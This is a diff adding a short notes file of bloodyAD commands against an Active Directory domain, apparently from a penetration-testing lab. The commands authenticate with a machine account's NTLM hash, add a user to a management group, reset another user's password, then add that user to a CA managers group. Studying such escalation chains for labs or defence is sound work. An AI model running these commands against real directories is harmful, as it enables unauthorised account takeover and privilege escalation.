@@ -1,0 +1,10 @@
+# ZPH-SVRMGMT1$ is a machine account. This command will use the hash of the machine account to add marcus as a member of the 'GENERAL MANAGEMENT' group
+# 192.168.210.10 -> zph-svrdc01.zsm.local
+bloodyAD --host 192.168.210.10 -d zsm.local -u ZPH-SVRMGMT1$ -p :ntlm_hash add groupMember 'GENERAL MANAGEMENT' marcus 
+
+# Using marcus account, change jamie password to 'P@ssw0rd1'
+bloodyAD --host 192.168.210.10 -d zsm.local -u marcus -p 'some_password' set password jamie P@ssw0rd1
+
+# Using jamie account, add jamie himself to CA managers group
+bloodyAD --host 192.168.210.10 -d zsm.local -u jamie -p P@ssw0rd1 add groupMember 'CA MANAGERS' jamie 
+
